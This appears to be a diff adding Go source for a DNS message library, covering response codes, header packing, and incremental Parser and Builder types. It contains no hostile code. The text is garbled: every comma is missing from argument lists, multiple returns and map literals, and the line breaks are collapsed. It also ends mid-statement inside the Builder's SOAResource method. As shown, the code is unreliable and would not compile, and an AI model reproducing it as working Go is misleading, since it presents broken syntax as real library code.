RCodeSuccess RCode = 0 // NoError + RCodeFormatError RCode = 1 // FormErr + RCodeServerFailure RCode = 2 // ServFail + RCodeNameError RCode = 3 // NXDomain + RCodeNotImplemented RCode = 4 // NotImp + RCodeRefused RCode = 5 // Refused +) + +var rCodeNames = map[RCode]string{ + RCodeSuccess: ""RCodeSuccess"" + RCodeFormatError: ""RCodeFormatError"" + RCodeServerFailure: ""RCodeServerFailure"" + RCodeNameError: ""RCodeNameError"" + RCodeNotImplemented: ""RCodeNotImplemented"" + RCodeRefused: ""RCodeRefused"" +} + +// String implements fmt.Stringer.String. +func (r RCode) String() string { + if n ok := rCodeNames[r]; ok { + return n + } + return printUint16(uint16(r)) +} + +// GoString implements fmt.GoStringer.GoString. +func (r RCode) GoString() string { + if n ok := rCodeNames[r]; ok { + return ""dnsmessage."" + n + } + return printUint16(uint16(r)) +} + +func printPaddedUint8(i uint8) string { + b := byte(i) + return string([]byte{ + b/100 + '0' + b/10%10 + '0' + b%10 + '0' + }) +} + +func printUint8Bytes(buf []byte i uint8) []byte { + b := byte(i) + if i >= 100 { + buf = append(buf b/100+'0') + } + if i >= 10 { + buf = append(buf b/10%10+'0') + } + return append(buf b%10+'0') +} + +func printByteSlice(b []byte) string { + if len(b) == 0 { + return """" + } + buf := make([]byte 0 5*len(b)) + buf = printUint8Bytes(buf uint8(b[0])) + for _ n := range b[1:] { + buf = append(buf ' ' ' ') + buf = printUint8Bytes(buf uint8(n)) + } + return string(buf) +} + +const hexDigits = ""0123456789abcdef"" + +func printString(str []byte) string { + buf := make([]byte 0 len(str)) + for i := 0; i < len(str); i++ { + c := str[i] + if c == '.' || c == '-' || c == ' ' || + 'A' <= c && c <= 'Z' || + 'a' <= c && c <= 'z' || + '0' <= c && c <= '9' { + buf = append(buf c) + continue + } + + upper := c >> 4 + lower := (c << 4) >> 4 + buf = append( + buf + '\\' + 'x' + hexDigits[upper] + hexDigits[lower] + ) + } + return string(buf) +} + +func printUint16(i uint16) string { + return printUint32(uint32(i)) +} + +func printUint32(i uint32) string { + // Max value is 4294967295. + buf := make([]byte 10) + for b d := buf uint32(1000000000); d > 0; d /= 10 { + b[0] = byte(i/d%10 + '0') + if b[0] == '0' && len(b) == len(buf) && len(buf) > 1 { + buf = buf[1:] + } + b = b[1:] + i %= d + } + return string(buf) +} + +func printBool(b bool) string { + if b { + return ""true"" + } + return ""false"" +} + +var ( + // ErrNotStarted indicates that the prerequisite information isn't + // available yet because the previous records haven't been appropriately + // parsed skipped or finished. + ErrNotStarted = errors.New(""parsing/packing of this type isn't available yet"") + + // ErrSectionDone indicated that all records in the section have been + // parsed or finished. + ErrSectionDone = errors.New(""parsing/packing of this section has completed"") + + errBaseLen = errors.New(""insufficient data for base length type"") + errCalcLen = errors.New(""insufficient data for calculated length type"") + errReserved = errors.New(""segment prefix is reserved"") + errTooManyPtr = errors.New(""too many pointers (>10)"") + errInvalidPtr = errors.New(""invalid pointer"") + errInvalidName = errors.New(""invalid dns name"") + errNilResouceBody = errors.New(""nil resource body"") + errResourceLen = errors.New(""insufficient data for resource body length"") + errSegTooLong = errors.New(""segment length too long"") + errNameTooLong = errors.New(""name too long"") + errZeroSegLen = errors.New(""zero length segment"") + errResTooLong = errors.New(""resource length too long"") + errTooManyQuestions = errors.New(""too many Questions to pack (>65535)"") + errTooManyAnswers = errors.New(""too many Answers to pack (>65535)"") + errTooManyAuthorities = errors.New(""too many Authorities to pack (>65535)"") + errTooManyAdditionals = errors.New(""too many Additionals to pack (>65535)"") + errNonCanonicalName = errors.New(""name is not in canonical format (it must end with a .)"") + errStringTooLong = errors.New(""character string exceeds maximum length (255)"") +) + +// Internal constants. +const ( + // packStartingCap is the default initial buffer size allocated during + // packing. + // + // The starting capacity doesn't matter too much but most DNS responses + // Will be <= 512 bytes as it is the limit for DNS over UDP. + packStartingCap = 512 + + // uint16Len is the length (in bytes) of a uint16. + uint16Len = 2 + + // uint32Len is the length (in bytes) of a uint32. + uint32Len = 4 + + // headerLen is the length (in bytes) of a DNS header. + // + // A header is comprised of 6 uint16s and no padding. + headerLen = 6 * uint16Len +) + +type nestedError struct { + // s is the current level's error message. + s string + + // err is the nested error. + err error +} + +// nestedError implements error.Error. +func (e *nestedError) Error() string { + return e.s + "": "" + e.err.Error() +} + +// Header is a representation of a DNS message header. +type Header struct { + ID uint16 + Response bool + OpCode OpCode + Authoritative bool + Truncated bool + RecursionDesired bool + RecursionAvailable bool + AuthenticData bool + CheckingDisabled bool + RCode RCode +} + +func (m *Header) pack() (id uint16 bits uint16) { + id = m.ID + bits = uint16(m.OpCode)<<11 | uint16(m.RCode) + if m.RecursionAvailable { + bits |= headerBitRA + } + if m.RecursionDesired { + bits |= headerBitRD + } + if m.Truncated { + bits |= headerBitTC + } + if m.Authoritative { + bits |= headerBitAA + } + if m.Response { + bits |= headerBitQR + } + if m.AuthenticData { + bits |= headerBitAD + } + if m.CheckingDisabled { + bits |= headerBitCD + } + return +} + +// GoString implements fmt.GoStringer.GoString. +func (m *Header) GoString() string { + return ""dnsmessage.Header{"" + + ""ID: "" + printUint16(m.ID) + "" "" + + ""Response: "" + printBool(m.Response) + "" "" + + ""OpCode: "" + m.OpCode.GoString() + "" "" + + ""Authoritative: "" + printBool(m.Authoritative) + "" "" + + ""Truncated: "" + printBool(m.Truncated) + "" "" + + ""RecursionDesired: "" + printBool(m.RecursionDesired) + "" "" + + ""RecursionAvailable: "" + printBool(m.RecursionAvailable) + "" "" + + ""AuthenticData: "" + printBool(m.AuthenticData) + "" "" + + ""CheckingDisabled: "" + printBool(m.CheckingDisabled) + "" "" + + ""RCode: "" + m.RCode.GoString() + ""}"" +} + +// Message is a representation of a DNS message. +type Message struct { + Header + Questions []Question + Answers []Resource + Authorities []Resource + Additionals []Resource +} + +type section uint8 + +const ( + sectionNotStarted section = iota + sectionHeader + sectionQuestions + sectionAnswers + sectionAuthorities + sectionAdditionals + sectionDone + + headerBitQR = 1 << 15 // query/response (response=1) + headerBitAA = 1 << 10 // authoritative + headerBitTC = 1 << 9 // truncated + headerBitRD = 1 << 8 // recursion desired + headerBitRA = 1 << 7 // recursion available + headerBitAD = 1 << 5 // authentic data + headerBitCD = 1 << 4 // checking disabled +) + +var sectionNames = map[section]string{ + sectionHeader: ""header"" + sectionQuestions: ""Question"" + sectionAnswers: ""Answer"" + sectionAuthorities: ""Authority"" + sectionAdditionals: ""Additional"" +} + +// header is the wire format for a DNS message header. +type header struct { + id uint16 + bits uint16 + questions uint16 + answers uint16 + authorities uint16 + additionals uint16 +} + +func (h *header) count(sec section) uint16 { + switch sec { + case sectionQuestions: + return h.questions + case sectionAnswers: + return h.answers + case sectionAuthorities: + return h.authorities + case sectionAdditionals: + return h.additionals + } + return 0 +} + +// pack appends the wire format of the header to msg. +func (h *header) pack(msg []byte) []byte { + msg = packUint16(msg h.id) + msg = packUint16(msg h.bits) + msg = packUint16(msg h.questions) + msg = packUint16(msg h.answers) + msg = packUint16(msg h.authorities) + return packUint16(msg h.additionals) +} + +func (h *header) unpack(msg []byte off int) (int error) { + newOff := off + var err error + if h.id newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""id"" err} + } + if h.bits newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""bits"" err} + } + if h.questions newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""questions"" err} + } + if h.answers newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""answers"" err} + } + if h.authorities newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""authorities"" err} + } + if h.additionals newOff err = unpackUint16(msg newOff); err != nil { + return off &nestedError{""additionals"" err} + } + return newOff nil +} + +func (h *header) header() Header { + return Header{ + ID: h.id + Response: (h.bits & headerBitQR) != 0 + OpCode: OpCode(h.bits>>11) & 0xF + Authoritative: (h.bits & headerBitAA) != 0 + Truncated: (h.bits & headerBitTC) != 0 + RecursionDesired: (h.bits & headerBitRD) != 0 + RecursionAvailable: (h.bits & headerBitRA) != 0 + AuthenticData: (h.bits & headerBitAD) != 0 + CheckingDisabled: (h.bits & headerBitCD) != 0 + RCode: RCode(h.bits & 0xF) + } +} + +// A Resource is a DNS resource record. +type Resource struct { + Header ResourceHeader + Body ResourceBody +} + +func (r *Resource) GoString() string { + return ""dnsmessage.Resource{"" + + ""Header: "" + r.Header.GoString() + + "" Body: &"" + r.Body.GoString() + + ""}"" +} + +// A ResourceBody is a DNS resource record minus the header. +type ResourceBody interface { + // pack packs a Resource except for its header. + pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) + + // realType returns the actual type of the Resource. This is used to + // fill in the header Type field. + realType() Type + + // GoString implements fmt.GoStringer.GoString. + GoString() string +} + +// pack appends the wire format of the Resource to msg. +func (r *Resource) pack(msg []byte compression map[string]uint16 compressionOff int) ([]byte error) { + if r.Body == nil { + return msg errNilResouceBody + } + oldMsg := msg + r.Header.Type = r.Body.realType() + msg lenOff err := r.Header.pack(msg compression compressionOff) + if err != nil { + return msg &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + msg err = r.Body.pack(msg compression compressionOff) + if err != nil { + return msg &nestedError{""content"" err} + } + if err := r.Header.fixLen(msg lenOff preLen); err != nil { + return oldMsg err + } + return msg nil +} + +// A Parser allows incrementally parsing a DNS message. +// +// When parsing is started the Header is parsed. Next each Question can be +// either parsed or skipped. Alternatively all Questions can be skipped at +// once. When all Questions have been parsed attempting to parse Questions +// will return the [ErrSectionDone] error. +// After all Questions have been either parsed or skipped all +// Answers Authorities and Additionals can be either parsed or skipped in the +// same way and each type of Resource must be fully parsed or skipped before +// proceeding to the next type of Resource. +// +// Parser is safe to copy to preserve the parsing state. +// +// Note that there is no requirement to fully skip or parse the message. +type Parser struct { + msg []byte + header header + + section section + off int + index int + resHeaderValid bool + resHeaderOffset int + resHeaderType Type + resHeaderLength uint16 +} + +// Start parses the header and enables the parsing of Questions. +func (p *Parser) Start(msg []byte) (Header error) { + if p.msg != nil { + *p = Parser{} + } + p.msg = msg + var err error + if p.off err = p.header.unpack(msg 0); err != nil { + return Header{} &nestedError{""unpacking header"" err} + } + p.section = sectionQuestions + return p.header.header() nil +} + +func (p *Parser) checkAdvance(sec section) error { + if p.section < sec { + return ErrNotStarted + } + if p.section > sec { + return ErrSectionDone + } + p.resHeaderValid = false + if p.index == int(p.header.count(sec)) { + p.index = 0 + p.section++ + return ErrSectionDone + } + return nil +} + +func (p *Parser) resource(sec section) (Resource error) { + var r Resource + var err error + r.Header err = p.resourceHeader(sec) + if err != nil { + return r err + } + p.resHeaderValid = false + r.Body p.off err = unpackResourceBody(p.msg p.off r.Header) + if err != nil { + return Resource{} &nestedError{""unpacking "" + sectionNames[sec] err} + } + p.index++ + return r nil +} + +func (p *Parser) resourceHeader(sec section) (ResourceHeader error) { + if p.resHeaderValid { + p.off = p.resHeaderOffset + } + + if err := p.checkAdvance(sec); err != nil { + return ResourceHeader{} err + } + var hdr ResourceHeader + off err := hdr.unpack(p.msg p.off) + if err != nil { + return ResourceHeader{} err + } + p.resHeaderValid = true + p.resHeaderOffset = p.off + p.resHeaderType = hdr.Type + p.resHeaderLength = hdr.Length + p.off = off + return hdr nil +} + +func (p *Parser) skipResource(sec section) error { + if p.resHeaderValid && p.section == sec { + newOff := p.off + int(p.resHeaderLength) + if newOff > len(p.msg) { + return errResourceLen + } + p.off = newOff + p.resHeaderValid = false + p.index++ + return nil + } + if err := p.checkAdvance(sec); err != nil { + return err + } + var err error + p.off err = skipResource(p.msg p.off) + if err != nil { + return &nestedError{""skipping: "" + sectionNames[sec] err} + } + p.index++ + return nil +} + +// Question parses a single Question. +func (p *Parser) Question() (Question error) { + if err := p.checkAdvance(sectionQuestions); err != nil { + return Question{} err + } + var name Name + off err := name.unpack(p.msg p.off) + if err != nil { + return Question{} &nestedError{""unpacking Question.Name"" err} + } + typ off err := unpackType(p.msg off) + if err != nil { + return Question{} &nestedError{""unpacking Question.Type"" err} + } + class off err := unpackClass(p.msg off) + if err != nil { + return Question{} &nestedError{""unpacking Question.Class"" err} + } + p.off = off + p.index++ + return Question{name typ class} nil +} + +// AllQuestions parses all Questions. +func (p *Parser) AllQuestions() ([]Question error) { + // Multiple questions are valid according to the spec + // but servers don't actually support them. There will + // be at most one question here. + // + // Do not pre-allocate based on info in p.header since + // the data is untrusted. + qs := []Question{} + for { + q err := p.Question() + if err == ErrSectionDone { + return qs nil + } + if err != nil { + return nil err + } + qs = append(qs q) + } +} + +// SkipQuestion skips a single Question. +func (p *Parser) SkipQuestion() error { + if err := p.checkAdvance(sectionQuestions); err != nil { + return err + } + off err := skipName(p.msg p.off) + if err != nil { + return &nestedError{""skipping Question Name"" err} + } + if off err = skipType(p.msg off); err != nil { + return &nestedError{""skipping Question Type"" err} + } + if off err = skipClass(p.msg off); err != nil { + return &nestedError{""skipping Question Class"" err} + } + p.off = off + p.index++ + return nil +} + +// SkipAllQuestions skips all Questions. +func (p *Parser) SkipAllQuestions() error { + for { + if err := p.SkipQuestion(); err == ErrSectionDone { + return nil + } else if err != nil { + return err + } + } +} + +// AnswerHeader parses a single Answer ResourceHeader. +func (p *Parser) AnswerHeader() (ResourceHeader error) { + return p.resourceHeader(sectionAnswers) +} + +// Answer parses a single Answer Resource. +func (p *Parser) Answer() (Resource error) { + return p.resource(sectionAnswers) +} + +// AllAnswers parses all Answer Resources. +func (p *Parser) AllAnswers() ([]Resource error) { + // The most common query is for A/AAAA which usually returns + // a handful of IPs. + // + // Pre-allocate up to a certain limit since p.header is + // untrusted data. + n := int(p.header.answers) + if n > 20 { + n = 20 + } + as := make([]Resource 0 n) + for { + a err := p.Answer() + if err == ErrSectionDone { + return as nil + } + if err != nil { + return nil err + } + as = append(as a) + } +} + +// SkipAnswer skips a single Answer Resource. +// +// It does not perform a complete validation of the resource header which means +// it may return a nil error when the [AnswerHeader] would actually return an error. +func (p *Parser) SkipAnswer() error { + return p.skipResource(sectionAnswers) +} + +// SkipAllAnswers skips all Answer Resources. +func (p *Parser) SkipAllAnswers() error { + for { + if err := p.SkipAnswer(); err == ErrSectionDone { + return nil + } else if err != nil { + return err + } + } +} + +// AuthorityHeader parses a single Authority ResourceHeader. +func (p *Parser) AuthorityHeader() (ResourceHeader error) { + return p.resourceHeader(sectionAuthorities) +} + +// Authority parses a single Authority Resource. +func (p *Parser) Authority() (Resource error) { + return p.resource(sectionAuthorities) +} + +// AllAuthorities parses all Authority Resources. +func (p *Parser) AllAuthorities() ([]Resource error) { + // Authorities contains SOA in case of NXDOMAIN and friends + // otherwise it is empty. + // + // Pre-allocate up to a certain limit since p.header is + // untrusted data. + n := int(p.header.authorities) + if n > 10 { + n = 10 + } + as := make([]Resource 0 n) + for { + a err := p.Authority() + if err == ErrSectionDone { + return as nil + } + if err != nil { + return nil err + } + as = append(as a) + } +} + +// SkipAuthority skips a single Authority Resource. +// +// It does not perform a complete validation of the resource header which means +// it may return a nil error when the [AuthorityHeader] would actually return an error. +func (p *Parser) SkipAuthority() error { + return p.skipResource(sectionAuthorities) +} + +// SkipAllAuthorities skips all Authority Resources. +func (p *Parser) SkipAllAuthorities() error { + for { + if err := p.SkipAuthority(); err == ErrSectionDone { + return nil + } else if err != nil { + return err + } + } +} + +// AdditionalHeader parses a single Additional ResourceHeader. +func (p *Parser) AdditionalHeader() (ResourceHeader error) { + return p.resourceHeader(sectionAdditionals) +} + +// Additional parses a single Additional Resource. +func (p *Parser) Additional() (Resource error) { + return p.resource(sectionAdditionals) +} + +// AllAdditionals parses all Additional Resources. +func (p *Parser) AllAdditionals() ([]Resource error) { + // Additionals usually contain OPT and sometimes A/AAAA + // glue records. + // + // Pre-allocate up to a certain limit since p.header is + // untrusted data. + n := int(p.header.additionals) + if n > 10 { + n = 10 + } + as := make([]Resource 0 n) + for { + a err := p.Additional() + if err == ErrSectionDone { + return as nil + } + if err != nil { + return nil err + } + as = append(as a) + } +} + +// SkipAdditional skips a single Additional Resource. +// +// It does not perform a complete validation of the resource header which means +// it may return a nil error when the [AdditionalHeader] would actually return an error. +func (p *Parser) SkipAdditional() error { + return p.skipResource(sectionAdditionals) +} + +// SkipAllAdditionals skips all Additional Resources. +func (p *Parser) SkipAllAdditionals() error { + for { + if err := p.SkipAdditional(); err == ErrSectionDone { + return nil + } else if err != nil { + return err + } + } +} + +// CNAMEResource parses a single CNAMEResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) CNAMEResource() (CNAMEResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeCNAME { + return CNAMEResource{} ErrNotStarted + } + r err := unpackCNAMEResource(p.msg p.off) + if err != nil { + return CNAMEResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// MXResource parses a single MXResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) MXResource() (MXResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeMX { + return MXResource{} ErrNotStarted + } + r err := unpackMXResource(p.msg p.off) + if err != nil { + return MXResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// NSResource parses a single NSResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) NSResource() (NSResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeNS { + return NSResource{} ErrNotStarted + } + r err := unpackNSResource(p.msg p.off) + if err != nil { + return NSResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// PTRResource parses a single PTRResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) PTRResource() (PTRResource error) { + if !p.resHeaderValid || p.resHeaderType != TypePTR { + return PTRResource{} ErrNotStarted + } + r err := unpackPTRResource(p.msg p.off) + if err != nil { + return PTRResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// SOAResource parses a single SOAResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) SOAResource() (SOAResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeSOA { + return SOAResource{} ErrNotStarted + } + r err := unpackSOAResource(p.msg p.off) + if err != nil { + return SOAResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// TXTResource parses a single TXTResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) TXTResource() (TXTResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeTXT { + return TXTResource{} ErrNotStarted + } + r err := unpackTXTResource(p.msg p.off p.resHeaderLength) + if err != nil { + return TXTResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// SRVResource parses a single SRVResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) SRVResource() (SRVResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeSRV { + return SRVResource{} ErrNotStarted + } + r err := unpackSRVResource(p.msg p.off) + if err != nil { + return SRVResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// AResource parses a single AResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) AResource() (AResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeA { + return AResource{} ErrNotStarted + } + r err := unpackAResource(p.msg p.off) + if err != nil { + return AResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// AAAAResource parses a single AAAAResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) AAAAResource() (AAAAResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeAAAA { + return AAAAResource{} ErrNotStarted + } + r err := unpackAAAAResource(p.msg p.off) + if err != nil { + return AAAAResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// OPTResource parses a single OPTResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) OPTResource() (OPTResource error) { + if !p.resHeaderValid || p.resHeaderType != TypeOPT { + return OPTResource{} ErrNotStarted + } + r err := unpackOPTResource(p.msg p.off p.resHeaderLength) + if err != nil { + return OPTResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// UnknownResource parses a single UnknownResource. +// +// One of the XXXHeader methods must have been called before calling this +// method. +func (p *Parser) UnknownResource() (UnknownResource error) { + if !p.resHeaderValid { + return UnknownResource{} ErrNotStarted + } + r err := unpackUnknownResource(p.resHeaderType p.msg p.off p.resHeaderLength) + if err != nil { + return UnknownResource{} err + } + p.off += int(p.resHeaderLength) + p.resHeaderValid = false + p.index++ + return r nil +} + +// Unpack parses a full Message. +func (m *Message) Unpack(msg []byte) error { + var p Parser + var err error + if m.Header err = p.Start(msg); err != nil { + return err + } + if m.Questions err = p.AllQuestions(); err != nil { + return err + } + if m.Answers err = p.AllAnswers(); err != nil { + return err + } + if m.Authorities err = p.AllAuthorities(); err != nil { + return err + } + if m.Additionals err = p.AllAdditionals(); err != nil { + return err + } + return nil +} + +// Pack packs a full Message. +func (m *Message) Pack() ([]byte error) { + return m.AppendPack(make([]byte 0 packStartingCap)) +} + +// AppendPack is like Pack but appends the full Message to b and returns the +// extended buffer. +func (m *Message) AppendPack(b []byte) ([]byte error) { + // Validate the lengths. It is very unlikely that anyone will try to + // pack more than 65535 of any particular type but it is possible and + // we should fail gracefully. + if len(m.Questions) > int(^uint16(0)) { + return nil errTooManyQuestions + } + if len(m.Answers) > int(^uint16(0)) { + return nil errTooManyAnswers + } + if len(m.Authorities) > int(^uint16(0)) { + return nil errTooManyAuthorities + } + if len(m.Additionals) > int(^uint16(0)) { + return nil errTooManyAdditionals + } + + var h header + h.id h.bits = m.Header.pack() + + h.questions = uint16(len(m.Questions)) + h.answers = uint16(len(m.Answers)) + h.authorities = uint16(len(m.Authorities)) + h.additionals = uint16(len(m.Additionals)) + + compressionOff := len(b) + msg := h.pack(b) + + // RFC 1035 allows (but does not require) compression for packing. RFC + // 1035 requires unpacking implementations to support compression so + // unconditionally enabling it is fine. + // + // DNS lookups are typically done over UDP and RFC 1035 states that UDP + // DNS messages can be a maximum of 512 bytes long. Without compression + // many DNS response messages are over this limit so enabling + // compression will help ensure compliance. + compression := map[string]uint16{} + + for i := range m.Questions { + var err error + if msg err = m.Questions[i].pack(msg compression compressionOff); err != nil { + return nil &nestedError{""packing Question"" err} + } + } + for i := range m.Answers { + var err error + if msg err = m.Answers[i].pack(msg compression compressionOff); err != nil { + return nil &nestedError{""packing Answer"" err} + } + } + for i := range m.Authorities { + var err error + if msg err = m.Authorities[i].pack(msg compression compressionOff); err != nil { + return nil &nestedError{""packing Authority"" err} + } + } + for i := range m.Additionals { + var err error + if msg err = m.Additionals[i].pack(msg compression compressionOff); err != nil { + return nil &nestedError{""packing Additional"" err} + } + } + + return msg nil +} + +// GoString implements fmt.GoStringer.GoString. +func (m *Message) GoString() string { + s := ""dnsmessage.Message{Header: "" + m.Header.GoString() + "" "" + + ""Questions: []dnsmessage.Question{"" + if len(m.Questions) > 0 { + s += m.Questions[0].GoString() + for _ q := range m.Questions[1:] { + s += "" "" + q.GoString() + } + } + s += ""} Answers: []dnsmessage.Resource{"" + if len(m.Answers) > 0 { + s += m.Answers[0].GoString() + for _ a := range m.Answers[1:] { + s += "" "" + a.GoString() + } + } + s += ""} Authorities: []dnsmessage.Resource{"" + if len(m.Authorities) > 0 { + s += m.Authorities[0].GoString() + for _ a := range m.Authorities[1:] { + s += "" "" + a.GoString() + } + } + s += ""} Additionals: []dnsmessage.Resource{"" + if len(m.Additionals) > 0 { + s += m.Additionals[0].GoString() + for _ a := range m.Additionals[1:] { + s += "" "" + a.GoString() + } + } + return s + ""}}"" +} + +// A Builder allows incrementally packing a DNS message. +// +// Example usage: +// +// buf := make([]byte 2 514) +// b := NewBuilder(buf Header{...}) +// b.EnableCompression() +// // Optionally start a section and add things to that section. +// // Repeat adding sections as necessary. +// buf err := b.Finish() +// // If err is nil buf[2:] will contain the built bytes. +type Builder struct { + // msg is the storage for the message being built. + msg []byte + + // section keeps track of the current section being built. + section section + + // header keeps track of what should go in the header when Finish is + // called. + header header + + // start is the starting index of the bytes allocated in msg for header. + start int + + // compression is a mapping from name suffixes to their starting index + // in msg. + compression map[string]uint16 +} + +// NewBuilder creates a new builder with compression disabled. +// +// Note: Most users will want to immediately enable compression with the +// EnableCompression method. See that method's comment for why you may or may +// not want to enable compression. +// +// The DNS message is appended to the provided initial buffer buf (which may be +// nil) as it is built. The final message is returned by the (*Builder).Finish +// method which includes buf[:len(buf)] and may return the same underlying +// array if there was sufficient capacity in the slice. +func NewBuilder(buf []byte h Header) Builder { + if buf == nil { + buf = make([]byte 0 packStartingCap) + } + b := Builder{msg: buf start: len(buf)} + b.header.id b.header.bits = h.pack() + var hb [headerLen]byte + b.msg = append(b.msg hb[:]...) + b.section = sectionHeader + return b +} + +// EnableCompression enables compression in the Builder. +// +// Leaving compression disabled avoids compression related allocations but can +// result in larger message sizes. Be careful with this mode as it can cause +// messages to exceed the UDP size limit. +// +// According to RFC 1035 section 4.1.4 the use of compression is optional but +// all implementations must accept both compressed and uncompressed DNS +// messages. +// +// Compression should be enabled before any sections are added for best results. +func (b *Builder) EnableCompression() { + b.compression = map[string]uint16{} +} + +func (b *Builder) startCheck(s section) error { + if b.section <= sectionNotStarted { + return ErrNotStarted + } + if b.section > s { + return ErrSectionDone + } + return nil +} + +// StartQuestions prepares the builder for packing Questions. +func (b *Builder) StartQuestions() error { + if err := b.startCheck(sectionQuestions); err != nil { + return err + } + b.section = sectionQuestions + return nil +} + +// StartAnswers prepares the builder for packing Answers. +func (b *Builder) StartAnswers() error { + if err := b.startCheck(sectionAnswers); err != nil { + return err + } + b.section = sectionAnswers + return nil +} + +// StartAuthorities prepares the builder for packing Authorities. +func (b *Builder) StartAuthorities() error { + if err := b.startCheck(sectionAuthorities); err != nil { + return err + } + b.section = sectionAuthorities + return nil +} + +// StartAdditionals prepares the builder for packing Additionals. +func (b *Builder) StartAdditionals() error { + if err := b.startCheck(sectionAdditionals); err != nil { + return err + } + b.section = sectionAdditionals + return nil +} + +func (b *Builder) incrementSectionCount() error { + var count *uint16 + var err error + switch b.section { + case sectionQuestions: + count = &b.header.questions + err = errTooManyQuestions + case sectionAnswers: + count = &b.header.answers + err = errTooManyAnswers + case sectionAuthorities: + count = &b.header.authorities + err = errTooManyAuthorities + case sectionAdditionals: + count = &b.header.additionals + err = errTooManyAdditionals + } + if *count == ^uint16(0) { + return err + } + *count++ + return nil +} + +// Question adds a single Question. +func (b *Builder) Question(q Question) error { + if b.section < sectionQuestions { + return ErrNotStarted + } + if b.section > sectionQuestions { + return ErrSectionDone + } + msg err := q.pack(b.msg b.compression b.start) + if err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +func (b *Builder) checkResourceSection() error { + if b.section < sectionAnswers { + return ErrNotStarted + } + if b.section > sectionAdditionals { + return ErrSectionDone + } + return nil +} + +// CNAMEResource adds a single CNAMEResource. +func (b *Builder) CNAMEResource(h ResourceHeader r CNAMEResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""CNAMEResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// MXResource adds a single MXResource. +func (b *Builder) MXResource(h ResourceHeader r MXResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""MXResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// NSResource adds a single NSResource. +func (b *Builder) NSResource(h ResourceHeader r NSResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""NSResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// PTRResource adds a single PTRResource. +func (b *Builder) PTRResource(h ResourceHeader r PTRResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""PTRResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return nil +} + +// SOAResource adds a single SOAResource. +func (b *Builder) SOAResource(h ResourceHeader r SOAResource) error { + if err := b.checkResourceSection(); err != nil { + return err + } + h.Type = r.realType() + msg lenOff err := h.pack(b.msg b.compression b.start) + if err != nil { + return &nestedError{""ResourceHeader"" err} + } + preLen := len(msg) + if msg err = r.pack(msg b.compression b.start); err != nil { + return &nestedError{""SOAResource body"" err} + } + if err := h.fixLen(msg lenOff preLen); err != nil { + return err + } + if err := b.incrementSectionCount(); err != nil { + return err + } + b.msg = msg + return 